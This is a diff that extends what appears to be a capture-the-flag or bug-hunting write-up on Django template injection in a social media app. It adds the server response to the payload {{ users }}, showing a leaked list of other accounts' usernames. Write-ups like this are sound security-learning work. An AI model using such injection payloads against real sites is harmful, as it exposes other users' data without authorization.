@@ -35,4 +35,12 @@ I created a new account and started testing various parameters on the social med
 <img width="1364" height="222" alt="image" src="https://github.com/user-attachments/assets/075bcd2d-3645-4e99-a4e4-2081d49f9440" /> <br>
 Here, it wasn't the classic case of Jinja2 Template, it was Djangos Own Template Lanaguage, which is very limited of what we can actually do. After quite some time, I found the global <i>users</i> QuerySet Object via this simple payload:
 <pre><code class="language-none">{{ users }}</code></pre>
+Response:
+<pre><code class="language-html"><!-- ...PROFILES FROM OTHER USERS -->
+  <div class="likes-review-item">
+    <a href="/profile/27">
+        <img src="/media/profile.png" title="&lt;QuerySet [&lt;SocialUser: hexhunter&gt;, &lt;SocialUser: shadowcaster&gt;, &lt;SocialUser: blackhat_wolf&gt;, &lt;SocialUser: glitch&gt;, &lt;SocialUser: codebreaker&gt;, &lt;SocialUser: shadowmancer&gt;, &lt;SocialUser: whitehat&gt;, &lt;SocialUser: brute_force&gt;, &lt;SocialUser: shadowwalker&gt;, &lt;SocialUser: {{ users }}&gt;]&gt;">
+    </a>
+</div></code></pre>
+
 
